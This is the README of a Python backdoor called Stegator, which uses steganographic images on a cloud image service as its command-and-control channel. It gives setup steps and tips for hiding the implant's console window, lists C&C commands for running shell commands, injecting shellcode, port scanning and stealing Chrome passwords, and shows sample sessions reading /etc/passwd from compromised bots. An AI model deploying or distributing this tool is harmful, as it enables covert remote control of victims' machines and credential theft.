Stegator
====
A Python based backdoor that uses a Cloud Image Service (Cloudinary) as a command and control server. Use by your own risk!

Using Steganography all the commands are "inserted" in ramdom images downloaded from imgur and uploaded to a Cloud service in this PoC Cloudinary.

This project has been inspired by [Gcat](https://github.com/byt3bl33d3r/gcat) and [Twittor](https://github.com/PaulSec/twittor) which does the same but using a Cloud Image Service in this Proof of concept Cloudinary but can be used in any other like Instagram, Flickr or Imgur using their API services.


Setup and Installation
============
Only are needed the dependencies mentioned below.

Dependencies
------------

* 2.7 < Python < 3.0
* python cloudinary module
* Steghide [steghide](http://steghide.sourceforge.net/)


Linux Debian
------
```
# apt-get install python python-pip python-dev build-essential libsqlite3-dev
# apt-get install steghide
# git clone https://github.com/1modm/stegator.git && cd stegator
# pip install -r requirements.lst
```

Windows
------
```
- Install python 2.X https://www.python.org/downloads/windows/
- Download https://github.com/1modm/stegator/archive/master.zip
- Install required modules
- Download Steghide [steghide](http://steghide.sourceforge.net/)
```

Also you need:
- A Cloudinary account (**Use a dedicated account! Do not use your personal one!**)
- Search and use the next account details: (Cloud name, API Key, API Secret)

This repository contains two files:
- ```stegator.py``` C&C
- ```implant.py``` Backdoor

In both files, edit the access token part and add the ones that you previously generated:

```python
cloudinary.config( 
  cloud_name = "xxxxxxxxxxxx", 
  api_key = "xxxxxxxxxxxx", 
  api_secret = "xxxxxxxxxxxx" 
)
```

You're probably going to want to compile ```implant.py``` into an executable using [Pyinstaller](https://github.com/pyinstaller/pyinstaller)
In order to remove the console when compiling with Pyinstaller, the flags ```--noconsole --onefile``` will help. Just saying. 

Usage
=====

In order to run the C&C:

```
$ python stegator.py
```

You'll then get into an 'interactive' shell which offers few commands that are:

```
C&C console > help


 cleanup - Clean Cloud Service images
 refresh - Refresh C&C control and ping all bots
 bots - List active bots
 commands - List executed commands
 retrieve <jobid> - Retrieve jobid command
 cmd <MAC ADDRESS> command - Execute the command on the bot
 shellcode <MAC ADDRESS> shellcode - Load and execute shellcode in memory (Windows only)
 scanner <MAC ADDRESS> <IP>:<PORT> - Port scanner example: scanner 0:0:0:0 192.168.1.1:22,80,443
 chromepasswords <MAC ADDRESS> - Retrieve Chrome Passwords from bot (Windows only)
 help - Print this usage
 exit - Exit the client


C&C console > 
```

- Once you've deployed the backdoor on a couple of systems, you can check available clients using the bots command:
```
C&C console > bots
Bot: 04:D6:27:72:A3:E9 Windows-7-6.1.7601-SP1
Bot: 68:A3:C4:F0:98:CE Linux-4.4.0-23-generic-x86_64-with-Ubuntu-16.04-xenial
Bot: 04:00:72:3F:D6:98 Linux-3.16.0-4-amd64-x86_64-with-debian-8.2
C&C console > 

```

The output is the MAC address which is used to uniquely identifies the system but also gives you OS information the implant is running on.


- Let's issue a command to an implant:
```
C&C console > cmd 04:D6:27:72:A3:E9 ipconfig
[+] Downloading image from Cloud Service...
[+] Uploaded image to Cloud Service
[+] Steganography applied, image saved
[+] Sent command ipconfig with jobid: 97ee81e0647a4f248ac47c68e8b25b88
C&C console >
```

- Lets get the results!

```
C&C console > retrieve 97ee81e0647a4f248ac47c68e8b25b88
97ee81e0647a4f248ac47c68e8b25b88: 
Configuracin IP de Windows


Adaptador de Ethernet Conexin de rea local:

   Sufijo DNS especfico para la conexin. . : Home
   Vnculo: direccin IPv6 local. . . : fe30::2c37:4432:4551:c71a%11
   Direccin IPv4. . . . . . . . . . . . . . : 192.168.66.25
   Mscara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : 192.168.66.1

Adaptador de tnel isatap.Home:

   Estado de los medios. . . . . . . . . . . : medios desconectados
   Sufijo DNS especfico para la conexin. . : Home

Adaptador de tnel Conexin de rea local*:

   Estado de los medios. . . . . . . . . . . : medios desconectados
   Sufijo DNS especfico para la conexin. . : 

C&C console > 

```


```
C&C console > cmd 04:00:72:3F:D6:98 cat /etc/passwd  
[+] Downloading image from Cloud Service...
[+] Uploaded image to Cloud Service
[+] Steganography applied, image saved
[+] Sent command cat /etc/passwd with jobid: 631f4ee7328244b8b462876e1f8dd753
C&C console > 
```

- Lets get the results!

```
C&C console > retrieve 631f4ee7328244b8b462876e1f8dd753
631f4ee7328244b8b462876e1f8dd753: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:110:117::/var/spool/postfix:/bin/false
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
haproxy:x:113:121::/var/lib/haproxy:/bin/false
proftpd:x:114:65534::/run/proftpd:/bin/false
ftp:x:115:65534::/srv/ftp:/bin/false

```

- Refresh results

In order to retrieve new bots/command outputs but also force the client to refresh the results, use the ```refresh``` command.

```
C&C console > refresh
[+] Sending command to retrieve alive bots
[+] Downloading image from Cloud Service...
[+] Uploaded image to Cloud Service
[+] Steganography applied, image saved
[+] Sleeping 10 secs to wait for bots

```

This will send a ```PING``` request and wait 10 seconds for them to answer.

- Retrieve previous commands

```
C&C console > commands
631f4ee7328244b8b462876e1f8dd753: 'cat /etc/passwd' on 04:00:72:3F:D6:98
97ee81e0647a4f248ac47c68e8b25b88: 'ipconfig' on 04:D6:27:72:A3:E9
C&C console > 

```

TODO 
=====

Write some self written code to avoid external libraries (steghide) and use some code like http://blog.brian.jp/python/png/2016/07/07/file-fun-with-pyhon.html

Project is entirely open source and released under MIT license.

Fork the project, contribute, submit pull requests, and have fun. 

If you find a bug, open an issue on Github and/or ping me on [Twitter](https://twitter.com/1_mod_m/).


Thanks 
=====
Thanks and feel free to check the [Twittor](https://github.com/PaulSec/twittor) and [Gcat](https://github.com/byt3bl33d3r/gcat) projects from [PaulWebSec](https://twitter.com/PaulWebSec) and [byt3bl33d3r](https://twitter.com/byt3bl33d3r) from which I forked the project.


Output
======
[![cast](https://asciinema.org/a/4oo26ixuqfzyknztyamw8qgdw.png)](https://asciinema.org/a/4oo26ixuqfzyknztyamw8qgdw?autoplay=1)

![cast](https://asciinema.org/a/4oo26ixuqfzyknztyamw8qgdw?autoplay=1 "cast")



